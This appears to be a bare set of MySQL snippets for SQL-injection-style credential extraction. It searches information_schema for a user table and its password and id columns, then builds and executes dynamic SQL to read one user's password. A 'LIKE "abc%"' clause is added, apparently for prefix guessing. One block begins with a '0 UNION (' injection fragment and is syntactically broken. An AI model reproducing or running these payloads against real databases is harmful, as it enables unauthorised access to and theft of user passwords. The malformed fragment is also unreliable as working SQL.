SELECT table_name
FROM information_schema.TABLES
WHERE table_name LIKE '%usr%' LIMIT 1;

0 UNION (
SELECT CONCAT(
    'SELECT ',
    (SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = t.TABLE_NAME AND COLUMN_NAME LIKE '%pwd%' LIMIT 1),
    ' FROM ', TABLE_NAME,
    ' WHERE ',
    (SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = t.TABLE_NAME AND COLUMN_NAME LIKE '%id%' LIMIT 1),
    ' = 322695107'
)
INTO @sql


PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
)

-- 1. Get the Table and Column names into variables first
SELECT
    t.TABLE_NAME,
    (SELECT COLUMN_NAME FROM information_schema.COLUMNS
     WHERE TABLE_NAME = t.TABLE_NAME AND COLUMN_NAME LIKE '%id%' LIMIT 1),
    (SELECT COLUMN_NAME FROM information_schema.COLUMNS
     WHERE TABLE_NAME = t.TABLE_NAME AND COLUMN_NAME LIKE '%pwd%' LIMIT 1)
INTO @target_table, @id_col, @pwd_col
FROM information_schema.TABLES t
WHERE TABLE_NAME LIKE '%usr%' LIMIT 1;

-- 2. Construct the SQL string using those variables
-- We use @pwd_col twice: once for the SELECT and once for the LIKE filter
SET @sql = CONCAT(
    'SELECT ', @pwd_col,
    ' FROM ', @target_table,
    ' WHERE ', @id_col, ' = 322695107',
    ' AND ', @pwd_col, ' LIKE "abc%"'
);

-- 3. Execute the statement
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
